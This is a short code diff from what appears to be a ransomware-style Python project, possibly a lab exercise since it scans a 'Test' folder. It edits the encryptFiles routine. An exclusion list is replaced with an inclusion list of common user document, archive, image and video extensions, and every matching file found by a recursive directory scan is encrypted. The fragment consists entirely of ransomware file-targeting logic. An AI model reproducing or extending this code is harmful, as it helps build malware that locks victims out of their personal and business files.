@@ -84,7 +84,8 @@ def decrypt(file, key):
 '''
 def encryptFiles(key):
     # list of filetypes to avoid when encrypting
-    exclude = ['.py','.pem', '.exe', '.imin']
+    #exclude = ['.py','.pem', '.exe', '.imin']
+    include = ['.pdf','.txt','.docx','.xlsx','.ppm','.tar','.zip','.jpeg','.mp4','.jar','.png','.gif']
     # loop through our filesystem
     for item in recursiveScan(os.getcwd() + '\Test'): 
         # generate the path
@@ -92,10 +93,12 @@ def encryptFiles(key):
         extension = filePath.suffix.lower()
 
 
-        if extension in exclude:
-            continue
+        #if extension in exclude:
+        #    continue
         # if the file isn't one of the exclude filetypes, encrypt it
-        encrypt(filePath, key)
+        #if file is in include filetypes, encrypt it
+        if extension in include:
+            encrypt(filePath, key)
        
 '''
     Function to call decrypt on all files in the given directory
